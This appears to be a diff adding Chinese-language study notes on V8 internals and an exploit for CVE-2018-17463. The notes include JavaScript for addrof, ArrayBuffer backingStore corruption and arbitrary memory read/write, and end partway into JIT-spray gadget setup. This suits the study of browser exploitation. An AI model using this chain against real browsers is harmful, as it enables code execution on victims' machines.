@@ -2352,5 +2352,1302 @@ CVE 分析：
 
 http://phrack.org/papers/jit_exploitation.html
 
+ubuntu 18.04：
 
+```bash
+git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+export PATH=/root/depot_tools:$PATH
+
+cd depot_tools
+mkdir v8 && cd v8
+fetch v8
+git checkout 568979f4d891bafec875fab20f608ff9392f4f29
+gclient sync
+tools/dev/v8gen.py x64.debug
+ninja -C out.gn/x64.debug d8
+```
+
+
+
+POC:
+
+```js
+function check_vul(){
+    function bad_create(x){
+        x.a;
+        Object.create(x);
+        return x.b;
+
+    }
+
+    for (let i = 0;i < 10000; i++){
+        let x = {a : 0x1234};
+        x.b = 0x5678; 
+        let res = bad_create(x);
+        if( res != 0x5678){
+            console.log(i);
+            console.log("CVE-2018-17463 exists in the d8");
+            return;
+        }
+
+    }
+    throw "bad d8 version";
+}
+check_vul();
+```
+
+
+
+**V8 介紹**
+
+V8 有各式各樣的 feature，其中許多都有大量的文件可以查閱，幾個特別的 feature 為：
+
+- 一堆 builtin functions
+  - 執行 d8 (v8's JavaScript shell) 時加上  `--allow-natives-syntax`  flag，就能使用：
+    -  `%DebugPrint` - 印出 object 詳細的資訊
+    -  `%CollectGarbage` - force gc
+    -  `%OptimizeFunctionOnNextCall` - force JIT
+- 很多 trace mode 的 flag 可以用，像是產生 trace call 的圖，`./d8 --help` 能看到一堆
+- 在 `tools/` 底下有很多 script 可以用，或是 visualizer of the JIT IR called turbolize
+  - `tools/gdbinit` 為 v8 的 gdb script
+
+
+
+[src/objects.h](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/objects.h;l=6;drc=7fc1bf7f07dacab1be87c6fde304750df5b7d4cd?q=objects.h&sq=) 定義了許多 JS value type：
+
+```js
+// Inheritance hierarchy:
+// - Object
+//   - Smi          (immediate small integer)
+//   - TaggedIndex  (properly sign-extended immediate small integer)
+//   - HeapObject   (superclass for everything allocated in the heap)
+//     - JSReceiver  (suitable for property access)
+//       - JSObject
+//         - JSArray
+//         - JSArrayBuffer
+//         - JSArrayBufferView
+//           - JSTypedArray
+//           - JSDataView
+...
+```
+
+其中 64-bit 的 object 使用 tag scheme：
+
+```
+Smi:        [32 bit signed int] [31 bits unused] 0
+HeapObject: [64 bit direct pointer]              | 01
+```
+
+而 object 的更多資訊可以在 object 的 offset 0 找到指向 map instance 的 pointer 。
+
+
+
+map 在 v8 當中極為重要，包含了以下資訊：
+
+- The **dynamic type** of the object, i.e. String, Uint8Array, HeapNumber, ...
+- The **size** of the object in bytes
+- The **properties** of the object and **where they are stored**
+  - property name 存在 map，而 property value 存在 object
+  - 通常會有三個地方存 property value：
+    - inside the object itself (**inline** properties)
+    - in a separate, **dynamically sized** **heap** buffer (**out-of-line** properties)
+    - if property name is an **integer index**, as array elements in a
+      **dynamically-sized heap array**
+- The **type of the array elements**, e.g. **unboxed doubles** or **tagged pointers**
+- The **prototype** of the object if any
+
+跟 JSC 的 structure 基本上是一樣的概念，而舉例來說：
+
+```js
+let o1 = {a: 42, b: 43};
+let o2 = {a: 1337, b: 1338};
+```
+
+會產生兩個 JSObject：
+
+```
+                      +----------------+
+                      |                |
+                      | map1           |
+                      |                |
+                      | property: slot |
+                      |      .a : 0    |
+                      |      .b : 1    |
+                      |                |
+                      +----------------+
+                          ^         ^
+    +--------------+      |         |
+    |              +------+         |
+    |    o1        |           +--------------+
+    |              |           |              |
+    | slot : value |           |    o2        |
+    |    0 : 42    |           |              |
+    |    1 : 43    |           | slot : value |
+    +--------------+           |    0 : 1337  |
+                               |    1 : 1338  |
+                               +--------------+
+```
+
+如果此時 `o1` 新增一個 property `.c`，會變成：
+
+```
+       +----------------+       +----------------+
+       |                |       |                |
+       | map1           |       | map2           |
+       |                |       |                |
+       | property: slot |       | property: slot |
+       | .a      : 0    |       | .a      : 0    |
+       | .b      : 1    |       | .b      : 1    |
+       |                |       | .c      : 2    |
+       +----------------+       +----------------+
+               ^                        ^
+               |                        |
+               |                        |
+        +--------------+         +--------------+
+        |              |         |              |
+        |    o2        |         |    o1        |
+        |              |         |              |
+        | slot : value |         | slot : value |
+        |    0 : 1337  |         |    0 : 1337  |
+        |    1 : 1338  |         |    1 : 1338  |
+        +--------------+         |    2 : 1339  |
+                                 +--------------+
+```
+
+如果待會 `o2` 也新增了  `.c`，`o1` 跟 `o2` 會再一次 share 同個 map (`map2`)，而 v8 就是持續不斷 track 每個新增 property 的 map。V8 還能夠將 properties 存成 hash map 而不是用  map / slot，在這個情況下 name 就**直接**被 mapped 到 value，這個機制在 engine 相信 Map 會有額外的 overhead，像是 singleton objects。
+
+實際測試一下：
+
+```js
+let obj = {
+	x: 0x41,
+    y: 0x42
+};
+obj.z = 0x43;
+obj[0] = 0x1337;
+obj[1] = 0x1338;
+%DebugPrint(obj)
+```
+
+`DebugPrint()` 的輸出結果：
+
+```
+DebugPrint: 0x3f2f2d0e1b9: [JS_OBJECT_TYPE]
+ - map: 0x220dc388ca21 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x3685155046d9 <Object map = 0x220dc38822f1>
+ - elements: 0x03f2f2d0e2f9 <FixedArray[17]> [HOLEY_ELEMENTS]
+ - properties: 0x03f2f2d0e2d1 <PropertyArray[3]> {
+    #x: 65 (data field 0)
+    #y: 66 (data field 1)
+    #z: 67 (data field 2) properties[0]
+ }
+ - elements: 0x03f2f2d0e2f9 <FixedArray[17]> {
+           0: 4919
+           1: 4920
+        2-16: 0x0a0ac5982681 <the_hole>
+ }
+0x220dc388ca21: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 40
+ - inobject properties: 2
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 2
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x220dc388c9d1 <Map(HOLEY_ELEMENTS)>
+ - prototype_validity cell: 0x368515506459 <Cell value= 0>
+ - instance descriptors (own) #3: 0x03f2f2d0e269 <DescriptorArray[11]>
+ - layout descriptor: (nil)
+ - prototype: 0x3685155046d9 <Object map = 0x220dc38822f1>
+ - constructor: 0x368515504711 <JSFunction Object (sfi = 0x13d0e6e8f991)>
+ - dependent code: 0x0a0ac5982391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+
+{0: 4919, 1: 4920, x: 65, y: 66, z: 67}
+```
+
+`obj` 的位置為 `0x3f2f2d0e1b9 - 1`，同時也包含 inline properties，有一開始的 `.x` --> `0x41` 以及 `.y` -->  `0x42`：
+
+```
+pwndbg> x/10gx 0x3f2f2d0e1b9 - 1
+0x3f2f2d0e1b8:	0x0000220dc388ca21	0x000003f2f2d0e2d1
+0x3f2f2d0e1c8:	0x000003f2f2d0e2f9	0x0000004100000000
+0x3f2f2d0e1d8:	0x0000004200000000	0x00000a0ac5982341
+...
+```
+
+- map 在第一個 8 bytes - `0x220dc388ca21 - 1`
+
+  ```
+  pwndbg> x/10gx 0x220dc388ca21 - 1
+  0x220dc388ca20:	0x00000a0ac5982251	0x1900042116020305
+  0x220dc388ca30:	0x0000000008200c03	0x00003685155046d9
+  0x220dc388ca40:	0x0000220dc388c9d1	0x0000000000000000
+  0x220dc388ca50:	0x000003f2f2d0e269	0x0000000000000000
+  0x220dc388ca60:	0x00000a0ac5982391	0x0000368515506459
+  ```
+
+- 第二個 8 bytes 為 `out-of-line properties` pointer，內容存放  `.z` 的 0x43 - `0x000003f2f2d0e2d1 - 1`
+
+  ```
+  pwndbg> x/10gx 0x000003f2f2d0e2d1 - 1
+  0x3f2f2d0e2d0:	0x00000a0ac5983899	0x0000000300000000
+  0x3f2f2d0e2e0:	0x0000004300000000	0x00000a0ac59825a1
+  0x3f2f2d0e2f0:	0x00000a0ac59825a1	0x00000a0ac5982881
+  ...
+  ```
+
+  - 第一個 8 bytes 同樣為 map pointer；第二個 8 bytes 為 size
+
+- 第三個 8 bytes 為 `element` pointer，也就是 integer index，包含 `0x1337`, `0x1338` - `0x000003f2f2d0e2f9 - 1`
+
+  ```
+  pwndbg> x/10gx 0x000003f2f2d0e2f9 - 1
+  0x3f2f2d0e2f8:	0x00000a0ac5982881	0x0000001100000000
+  0x3f2f2d0e308:	0x0000133700000000	0x0000133800000000
+  0x3f2f2d0e318:	0x00000a0ac5982681	0x00000a0ac5982681
+  ...
+  ```
+
+  - 前 8 bytes 也是 map pointer，第二個 8 bytes 則是 capacity
+  - `0x00000a0ac5982681` 為 the_hole，代表該空間為 overcommit
+
+每個 object 結構都用 map 來表示，意味著 map 的 reuse。
+
+
+
+**JIT**
+
+v8 內部的 JIT compiler 使用的是 [turbofan](https://v8.dev/docs/turbofan)，而關於 JIT，當一段程式碼非常 **hot**，代表一直被執行到，v8 內部會透過 JIT 將其編譯成 native code，像是：
+
+```js
+function add(a, b) {
+	return a + b;
+}
+```
+
+如果 a b 每次都傳入 integer，**可能**就會被優化成 (可能需考慮到其他因素)：
+
+```asm
+lea eax, [rdi + rsi]
+ret
+```
+
+但是優化的前提是假設 a b 都是 integer，如果今天傳入的是 float 甚至是 pointer，可能就會發生錯誤 (或是有漏洞)，或者是有 overflow 的情況發生。因此實際上產生出來的 machine code 會有額外的檢查，如 type checking、map checking 或是 overflow checking，像是：
+
+```asm
+lea     rax, [rdi+rsi]
+jo      bailout_integer_overflow # overflow checking
+ret
+
+; Ensure is Smi
+test    rdi, 0x1
+jnz     bailout # type checking
+
+; Ensure has expected Map
+cmp    QWORD PTR [rdi-0x1], 0x12345601
+jne    bailout # map checking
+```
+
+通常 JIT compiler 能得到的資訊只有先前的執行結果，並且轉出來的 native code 必須要快，又能要保證不會出狀況，而那些檢查稱作 **speculation guard**，並會用 bailout 的機制來 handle 預測失敗的情況，這些 **speculation guard** 必須處理在 interpreter time 會有，但是 native code 沒有的 informartion：
+
+1. Gather **type profiles** during execution in the interpreter
+2. Speculate **that the same types** will be used in the future
+3. **Guard those speculations** with runtime speculation guards
+4. Afterwards, produce **optimized code** for the previously seen types
+
+
+
+雖然使用者的 JavaScript code 會在內部被 interpreter 轉乘 bytecode，但是 JIT compilers 還是會產生 custom intermediate representation (IR) 來方便做 optimize。而 turbofan 的 IR 為 graph-based，由 operations (nodes) 以及
+different types of edges 所組成：
+
+- control-flow edges - connecting **control-flow operations** such as **loops** and **if** conditions
+- data-flow edges - connecting **input and output** values
+- effect-flow edges - which connect **effectual operations** such that they are scheduled correctly
+  - For example: consider a store to a property followed by **a load of the same property**. As there is **no data- or control-flow dependency** between the **two operations**, effect-flow is needed to **correctly schedule the store before the load**
+
+Turbofan IR support 三種不同的 operation：
+
+- JavaScript operations
+  - resemble a generic **bytecode instruction**
+- simplified operations
+  - 介在中間？
+- machine operations
+  - resemble a single **machine instruction**
+
+可以使用 v8's turbolizer tool (執行時加上 flag `--trace-turbo`) 來幫助觀察 JIT 的運作。
+
+1. **Graph building and specialization**
+   - the bytecode as well as **runtime type profiles from the interpreter** are consumed and an **IR graph**,
+     representing the same computations, is constructed
+   - Type profiles are inspected and based on them **speculations** are **formulated**, e.g. about which types of values to see for an operation
+   - The speculations are guarded with **speculation guards**
+2. **Optimization**
+   - the resulting graph, which now has **static type information** due to the **guards**, is optimized much like "**classic**" **ahead-of-time (AOT)** compilers do
+   - Here an optimization is defined as a **transformation of code** that is not required for correctness but
+     improves the execution speed or memory footprint of the code. Typical optimizations include **loop-invariant code motion**, **constant folding**, **escape analysis**, and **inlining**
+     - loop-invariant - 將循環不變的語句或表達式移到循環體之外，而不改變程序的語義
+3. **Lowering**
+   - finally, the resulting graph is lowered to **machine code** which is then written into an **executable memory region**
+   - From that point on, invoking the compiled function will result in a **transfer of execution to the generated code**
+
+而過去的執行狀態都會儲存在 feedback vector of the function，其中會觀察執行 function 時的 input type
+
+
+
+
+
+當 turbofan 開始 compiling，會先建立一個 JavaScript code 的 graph representation，同時檢查 feedback vector，基於觀察結果來預測 function 被呼叫時傳入的 object 其 Map，並且建置兩個 runtime check assumptions，如果失敗就會 **bail out** 給 interpreter。而之後會從 inline property 執行 property load，optimized graph 會長得像 (data-flow edges only)：
+
+```
+        +----------------+
+        |                |
+        |  Parameter[1]  |
+        |                |
+        +-------+--------+
+                |                   +-------------------+
+                |                   |                   |
+                +------------------->  CheckHeapObject  |
+                                    |                   |
+                                    +----------+--------+
+          +------------+                       |
+          |            |                       |
+          |  CheckMap  <-----------------------+
+          |            |
+          +-----+------+
+                |                   +------------------+
+                |                   |                  |
+                +------------------->  LoadField[+32]  |
+                                    |                  |
+                                    +----------+-------+
+           +----------+                        |
+           |          |                        |
+           |  Return  <------------------------+
+           |          |
+           +----------+
+```
+
+- lower to machine code likes:
+
+  ```asm
+  ; Ensure o is not a Smi
+  test    rdi, 0x1
+  jz      bailout_not_object
+  
+  ; Ensure o has the expected Map
+  cmp     QWORD PTR [rdi-0x1], 0xabcd1234 # 0xabcd1234 為指定的 map ptr
+  jne     bailout_wrong_map
+  
+  ; Perform operation for object with known Map
+  mov     rax, [rdi+0x1f]
+  ret
+  ```
+
+- 當 different map 傳入，會觸發 `bailout`，執行流程交給 interpreter (實際上會執行 bytecode 的 `LdaNamedProperty`)，其中可能會 discard compiled code，也有可能轉成 **polymorphic property load** 的模式，也就是多種 input type，也有可能 recompile 成新傳入的 type
+
+  - 如果選過於複雜，可能會用 **inline cache (IC)**
+  - IC caches **previous lookups** but can always **fall-back to the runtime function** for previously unseen input types **without bailing out of the JIT code**
+  - 上個沒看過的 type 會直接執行 runtime function 而非走 JIT code，並且 JIT code 不會被 discard
+
+而 JIT code 的 bug 來源有許多種：
+
+- bounds-check elimination (多)
+- escape analysis
+- register allocation
+- integer overflow
+- redundancy elimination 
+
+而在找 JIT 的洞時，最好先決定要找哪一種洞，除了有明確方向外，也可以對該漏洞的 exploit 更加熟悉。
+
+
+
+在 bug 當中，**remove safety checks** (Redundancy Elimination) 也很常見，舉例來說：
+
+```js
+function foo(o) {
+	return o.a + o.b;
+}
+```
+
+ 轉成 bytecode 後會像是：
+
+```
+CheckHeapObject o
+CheckMap o, map1
+r0 = Load [o + 0x18]
+
+CheckHeapObject o
+CheckMap o, map1
+r1 = Load [o + 0x20]
+
+r2 = Add r0, r1
+CheckNoOverflow
+Return r2
+```
+
+可以發現這邊會有兩個 `CheckHeapObject()`，基本上在**極大多數**情況下兩個 `Load` 中間是不會有 type 的變化的，因此可以看成第二個檢查是 redundant。但是有 operation 會有 side-effect 如改變 context，而最簡單的例子為在 check 中間呼叫 function 來改變 map 的結構 (新增 / 刪除 property)。
+
+
+
+**CVE analyze**
+
+IR operations 會有不同的 flags 代表不同的 attribute，其中一個是 `kNoWrite`，代表 engine 認為這個 operation 不會有其他的 side-effect (因為不會修改到任何數值)，舉例來說像是 `CACHED_OP_LIST()`：
+
+```cpp
+#define CACHED_OP_LIST(V)                                            \
+      ...                                                                \
+      V(CreateObject, Operator::kNoWrite, 1, 1)                          \
+      ...
+```
+
+不過如果要觀察是否 IR operation 會有 side-effect，必須要從 lower phase 來看 (直接是 machine insn)，對於 `JSCreateObject()` 來說，底層的實作在 [js-generic-lowering.cc]()：
+
+```cpp
+void JSGenericLowering::LowerJSCreateObject(Node* node) {
+      CallDescriptor::Flags flags = FrameStateFlagForCall(node);
+      Callable callable = Builtins::CallableFor(
+          isolate(), Builtins::kCreateObjectWithoutProperties);
+      ReplaceWithStubCall(node, callable, flags);
+}
+```
+
+這代表 `JSCreateObject()` 底層會呼叫 runtime function `CreateObjectWithoutProperties()`，而這個 function 最後會呼叫另一個用 C++ 實作的 built-in function `ObjectCreate()`，最後 control flow 會停在 `JSObject::OptimizeAsPrototype()` (v8/src/objects.cc)，但這個 function 可能會在 optimization 的過程中修改到 prototype object 而造成 side-effect：
+
+```cpp
+// static
+void JSObject::OptimizeAsPrototype(Handle<JSObject> object,
+                                   bool enable_setup_mode) {
+  ...
+  if (enable_setup_mode && PrototypeBenefitsFromNormalization(object)) {
+    // First normalize to ensure all JSFunctions are DATA_CONSTANT.
+    JSObject::NormalizeProperties(object, KEEP_INOBJECT_PROPERTIES, 0,
+                                  "NormalizeAsPrototype");
+  }
+  if (object->map()->is_prototype_map()) {
+    if (object->map()->should_be_fast_prototype_map() &&
+        !object->HasFastProperties()) {
+      JSObject::MigrateSlowToFast(object, 0, "OptimizeAsPrototype");
+    }
+  } else {
+    Handle<Map> new_map = Map::Copy(object->GetIsolate(),
+                                    handle(object->map(), object->GetIsolate()),
+                                    "CopyAsPrototype");
+    JSObject::MigrateToMap(object, new_map);
+    object->map()->set_is_prototype_map(true);
+
+    // Replace the pointer to the exact constructor with the Object function
+    // from the same context if undetectable from JS. This is to avoid keeping
+    // memory alive unnecessarily.
+    Object* maybe_constructor = object->map()->GetConstructor();
+    if (maybe_constructor->IsJSFunction()) {
+      JSFunction* constructor = JSFunction::cast(maybe_constructor);
+      if (!constructor->shared()->IsApiFunction()) {
+        Context* context = constructor->context()->native_context();
+        JSFunction* object_function = context->object_function();
+        object->map()->SetConstructor(object_function);
+      }
+    }
+  }
+}
+```
+
+測試：
+
+```js
+function hax(o) {
+	// Force a CheckMaps node.
+	o.a;
+
+	// Cause unexpected side-effects.
+	Object.create(o);
+
+	// Trigger type-confusion because CheckMaps node is removed.
+	return o.b;
+}
+```
+
+debug mode：
+
+```
+d8> let o = {a: 42}
+d8> o.b = 43
+
+d8> %DebugPrint(o)
+DebugPrint: 0xa777a982da1: [JS_OBJECT_TYPE]
+ - map: 0x04705bb8c9d1 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x26236aa046d9 <Object map = 0x4705bb822f1>
+ - elements: 0x039585802cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - properties: 0x0a777a984f29 <PropertyArray[3]> {
+    #a: 42 (data field 0)
+    #b: 43 (data field 1) properties[0]
+ }
+ ...
+{a: 42, b: 43}
+```
+
+```
+d8> hax(o)
+
+d8> %DebugPrint(o)
+DebugPrint: 0xa777a982da1: [JS_OBJECT_TYPE]
+ - map: 0x04705bb8be91 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
+ - prototype: 0x26236aa046d9 <Object map = 0x4705bb822f1>
+ - elements: 0x039585802cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - properties: 0x0a777a9857a1 <NameDictionary[29]> {
+   #a: 42 (data, dict_index: 1, attrs: [WEC])
+   #b: 43 (data, dict_index: 2, attrs: [WEC])
+ }
+...
+{a: 42, b: 43}
+```
+
+明顯在執行完 optimize 後的 `hax()`，function 內部的  `Object.create()` 讓 map 的 type 變成 `DictionaryProperties`。在文章中有註明說 **when becoming a prototype, out-of-line property storage of the object was converted to dictionary mode**，代表改變變成 prototype 時，out-of-line property 會轉成 dictionary 的格式，第二個 8 bytes 不再指向 `PropertyArray` 而是 `NameDictionary`：
+
+- `PropertyArray` - all properties one after each other, after a short header
+- `NameDictionary` - a more complex data structure directly mapping property names to values without relying on the Map
+
+會造成 Map change 的原因是因為 v8 內的 prototype Maps 不會 shared，因為 **clever optimization tricks** in other parts of the engine。要 trigger bug 有些條件：
+
+1. The function must receive an object that is **not currently used as a prototype**
+2. The function needs to perform a **CheckMap operation** so that subsequent ones can be eliminated
+3. The function needs to call `Object.create()` with the object as argument to **trigger the Map transition**
+4. The function needs to access an **out-of-line property**
+   - This will, after a `CheckMap` that will later be incorrectly eliminated, load **the pointer to the property storage**, then deference that believing that it is pointing to a `PropertyArray` even though it will point to a `NameDictionary`
+     - 以為指向 `PropertyArray`，但是在 `Object.create()` 後會指向 `NameDictionary`
+
+
+
+**exploit**
+
+`Object.create()` 這個 function 本來就會改變 prototype，但是因為 JIT 不知道這個 side effect，因此除掉了後續的檢測，導致在存取時會以 `PropertyArray` type 來做存取。
+
+
+
+這個 bug 可以讓 type 為  `PropertyArray` 的 array 作為 type  `NameDictionary` 來存取 (type confusion)，不過 `NameDictionary` 仍然在 dynamically sized inline buffer 中有存 name、value、flags 等等 properties。然而，會存在一組 property `P1` 以及 `P2` 分別存在 `PropertyArray` 或 `NameDictionary` 開頭的偏移某處，不過 `NameDictionary` 的結構會隨著 runtime environment 調整 (牽扯到 hashing mechanism)。這也代表著 `PropertyArray` 跟 `NameDictionary` 有一部分是 overlap，因此可以控制 `NameDictionary` 內的 value。
+
+```
+DebugPrint: 0x391c0bf58569: [JSArray]
+ - map: 0x3ef777f04fa1 <Map(PACKED_ELEMENTS)> [FastProperties]
+ - prototype: 0x26800da13b61 <JSArray[0]>
+ - elements: 0x391c0bf58459 <FixedArray[32]> [PACKED_ELEMENTS]
+ - length: 32
+ - properties: 0x13e904882cf1 <FixedArray[0]> {
+    #length: 0x27b2cd01a0a9 <AccessorInfo> (const accessor descriptor)
+ }
+ - elements: 0x391c0bf58459 <FixedArray[32]> {
+           0: 33
+           1: 0
+           2: 64
+           3: 34
+           4: 0
+           5: 0x0e30f15e5051 <String[2]: p6>
+           6: -6
+           7: 2288
+        8-10: 0x13e9048825a1 <undefined>
+          11: 0x0e30f15e5279 <String[3]: p29>
+          12: -29 <----- (here)
+          13: 8176
+       14-19: 0x13e9048825a1 <undefined>
+          20: 0x0e30f15e50b1 <String[3]: p10>
+          21: -10
+          22: 3312
+       23-28: 0x13e9048825a1 <undefined>
+          29: 0x0e30f15e5021 <String[2]: p4>
+          30: -4
+          31: 1776
+ }
+```
+
+
+
+map 會存 property 的 type information，以下方為例子：
+
+```js
+let o = {}
+o.a = 1337;
+o.b = {x: 42};
+```
+
+- o 的 map 會紀錄 `.a` 為 smi，`.b` 為 object (有其他的 map)
+
+```js
+function foo(o) {
+	return o.b.x;
+}
+```
+
+- 在優化完後只會檢查 `o` 的 map 而不會檢查 `.b`，而如果 type information 跟實際的 value type 不相同，engine 會分配新的 map，並且標注 property 的 type 可能會是舊的跟新的
+
+有了這些資訊就能建構出 exploit primitive：
+
+- 先找出 properties 當中的 matching pair property，而 compiler 會認定 P1 只會被 load typeA，但是轉換後的 P2 可以被 load typeB，但先前提到說若有不同的 type information，engine 會分配一個新的 map 同時包含兩種 type 的存取方式，此時就可以選擇要使用哪種 type (因為都是 valid)
+
+在此之前必須要找到 overlap 的 property index，才能構造出 `addrof()` 的 primitive，以下 sample code 包含了 `addrof()` 以及 `findOverlappingProperties()` 的做法，並且有加上註解：
+
+```js
+// find a pair (p1, p2) of properties such that p1 is stored at the same
+// offset in the FixedArray as p2 is in the NameDictionary
+let p1, p2;
+function findOverlappingProperties() {
+    let prop_names = [];
+    for (let i = 0; i < PROP_NUM; i++)
+        prop_names[i] = 'p' + i;
+
+    let command = `
+        function hax(o) {
+            o.inline;
+            this.Object.create(o);
+            ${prop_names.map((p) => `let ${p} = o.${p};`).join('\n')}
+            
+
+            // if bug happens, o.0 ~ o.p31 are accessed as FixArray
+            // but actually they are NameDictionary
+            // return [o.p0 ~ o.p31]
+            return [${prop_names.join(', ')}];
+        }
+    `;
+    eval(command);
+
+    let prop_vals = [];
+    for (let i = 1; i < PROP_NUM; i++)
+        // there are some unrelated, small-valued SMIs in the dictionary
+        // however they are all positive, so use negative SMIs
+        // don't use -0 though, that would be represented as a double
+        prop_vals[i] = -i;
+
+    // JIT + find overlap property
+    for (let j = 0; j < JIT_ITERATION; j++) {
+        let obj = makeObj(prop_vals); // obj -> PropertyArray
+        let r = hax(obj); // obj -> NameDictionary
+        /*
+        original:
+        1 -> -1
+        2 -> -2
+        3 -> -3
+        4 -> -4
+        ...
+        8 -> -8
+
+        after:
+        1 -> 12345678
+        2 -> -8787
+        3 -> -3 (same index, nonono...)
+        4 -> -8 (overlap with index 8)
+        ...
+        */
+
+        // traverse all NameDictionary array and find if there is a value equal -i
+        // but index != -i
+        for (let i = 1; i < PROP_NUM; i++) {
+            // properties that overlap with themselves cannot be used
+            if (i !== -r[i] /* index != -r[i] (overlap themselves) */ &&
+                r[i] < 0 /* ignore redundant dictionary value */ &&
+                r[i] > -PROP_NUM /* property value is in range -1 ~ -PROP_NUM+1 */) {
+                [p1, p2] = [i, -r[i]];
+                // %DebugPrint(r); // b v8::base::ieee754::cosh
+                // /Math.cosh(1);
+                return;
+            }
+        }
+    }
+}
+
+function addrof(obj) {
+    eval(`
+        function hax(o) {
+            o.inline;
+            this.Object.create(o);
+            return o.p${p1}.x1;
+        }
+    `);
+
+    let prop_vals = [];
+    // property p1 should have the same Map as the one used in
+    // corrupt() for simplicity
+    prop_vals[p1] = {x1: 13.37, x2: 13.38};
+    prop_vals[p2] = {y1: obj}; // an object contain our target
+
+    let boom = makeObj(prop_vals);
+    for (let i = 0; i < JIT_ITERATION; i++) {
+        let boom = makeObj(prop_vals);
+        let res = hax(boom);
+        // p2 in FixArray ----> p1 in NameDictionary
+        // p1.x1 (double) --> p2.y1 (obj) ===> show obj address as double
+        if (res != 13.37)
+            return res.toBigInt() - 1n; // tagged bit
+    }
+
+    throw "[-] addrof failed";
+}
+```
+
+有了 `addrof()` 即可取得 object 的 address，而後再用同樣的方式做 `write()`，控制 object 的 element，但此時必須尋找一個 object，其 property 有某 **pointer 指向被寫入/讀取的位置**，我們能透過 overwrite 該 pointer 達到 arbitrary r/w，而該 object 即是 `ArrayBuffer`，步驟如下：
+
+- 建立兩個 `ArrayBuffer` ab1 與 ab2
+- leak ab2 的 address
+- Corrupt ab1 的 `backingStore` pointer 為指向 ab2
+
+這樣就能透過 ab1 寫 ab2，ab2 在寫/讀任意位置：
+
+```
+	+-----------------+            +-----------------+
+    |  ArrayBuffer 1  |     +---->|  ArrayBuffer 2  |
+    |                 |     |     |                 |
+    |  map            |     |     |  map            |
+    |  properties     |     |     |  properties     |
+    |  elements       |     |     |  elements       |
+    |  byteLength     |     |     |  byteLength     |
+    |  backingStore --+-----+     |  backingStore   |
+    |  flags          |           |  flags          |
+    +-----------------+           +-----------------+
+```
+
+P.S. backingStore 指向 real heap address，而不是 v8 內部的 memory region
+
+`corrupt()` 做的行為是蓋掉某 ArrayBuffer 的 backingStore pointer：
+
+```js
+// corrupt the backingStore pointer of ab1 to
+// point to ab2
+function corrupt(victim, new_val) {
+    eval(`
+        function hax(o) {
+            o.inline;
+            this.Object.create(o);
+            let orig = o.p${p1}.x2;
+            // overwrite ab1 BS to ab2
+            // overwrite p1.x2 ---> p2.
+            o.p${p1}.x2 = ${new_val.toNumber()};
+            return orig;
+        }
+    `);
+
+    // x2 overlaps with the backingStore pointer of the ArrayBuffer
+
+    // why ? because o has two inline property x1 and x2, and inline property
+    // starts from 0x18 (after map, out-of-line properties, element pointer),
+    // and x2 is located at 0x20~0x27, which equals to backingStore pointer
+    // in ArrayBuffer(map, properties, element, byteLength, backingStore ...)
+    
+    let prop_vals = [];
+    let o = {x1: 13.37, x2: 13.38};
+    prop_vals[p1] = o; // will become an object map
+    prop_vals[p2] = victim; // will become ArrayBuffer
+    // if use {y1: victim}, will become an object map
+    for (let i = 0; i < JIT_ITERATION; i++) {
+        o.x2 = 13.38; // update to original value 
+        let boom = makeObj(prop_vals);
+        let r = hax(boom);
+        if (r != 13.38)
+            return r.toBigInt();
+    }
+
+    throw "[-] CorruptArrayBuffer failed";
+}
+```
+
+控制了 ab2 的 BS ptr 後，即可透過 ab2 做任意讀寫，最終將這些操作做成 function：
+
+```js
+let memory = {
+    write(addr, bytes) {
+        driver[4] = addr; // overwrite ab2 backingStore ptr
+        let memview = new Uint8Array(ab2); // uint8
+        memview.set(bytes);
+    }, read(addr, len) {
+        driver[4] = addr;
+        let memview = new Uint8Array(ab2);
+        return memview.subarray(0, len);
+    }, write64(addr, ptr) {
+        driver[4] = addr;
+        let memview = new BigUint64Array(ab2);
+        memview[0] = ptr;
+    }, read64(addr) {
+        driver[4] = addr;
+        let memview = new Uint64Array(ab2);
+        return memview[0];
+    }, addrof(obj) {
+        ab2.leakMe = obj;
+        let props = this.read64(ab2_addr + 8n); // get ool property ptr
+        return this.read64(props + 15) - 1n; // read ool property first element
+    }, fixup(obj) {
+        let ab1_addr = this.addrof(ab1);
+        let ab2_addr = this.addrof(ab2);
+        this.write64(ab1_addr + 32n, ab1_orig_BS);
+        this.write64(ab2_addr + 32n, ab2_orig_BS);
+    }
+};
+```
+
+
+
+**arbitrary code execution**
+
+此方法稱作 JIT spray，參考 https://github.com/kdmarti2/CVE-2018-17463/blob/main/CVE-2018-17463.js，不過最終在堆 rop 以及 gadget 的設計與其有些不同：
+
+```js
+let exploit_victim = {
+	trigger : function() {
+		return 0xdeadbeef;
+	},
+	// mov rsp, QWORD PTR [rsi]
+	stack_piviot_gadget : function() {
+		return 0xc3268b48|0;
+	},
+	// pop rsi, pop rdi, pop rax
+	pop_gadget: function() {
+		return 0xc3585f5e|0;
+	},
+	// pop rdx; syscall; ret
+	syscall_gadget: function() {
+		return 0xc3050f5a|0;
+	}
+};
+for (let i = 0; i < 100000; i++)
+{
+    exploit_victim.trigger();
+    exploit_victim.pop_gadget();
+    exploit_victim.syscall_gadget();
+    exploit_victim.stack_piviot_gadget();
+}
+```
+
+- 在執行玩 for loop 後，4 個 function 都會被 optimize
+
+- function 在 object 當中為 **JSFunction**，而 optimize 過的 function 又稱作 **OPTIMIZED_FUNCTION**
+
+- 其中 **JSFunction** prototype 中有一個 attribute 叫做 `code`，offset 為 `0x30`
+
+  - JS type 為 `v8::internal::JSFunction`
+
+- `code` 的 JS type 為 `v8::internal::Code`
+
+  - [object source code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/code.h)，但是 JIT code 的 entry 在 [execution.cc](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/execution/execution.cc;l=350;drc=612d14c8a9ad56b0f873a7c69b43da34d3ef31d8?q=execution.cc)
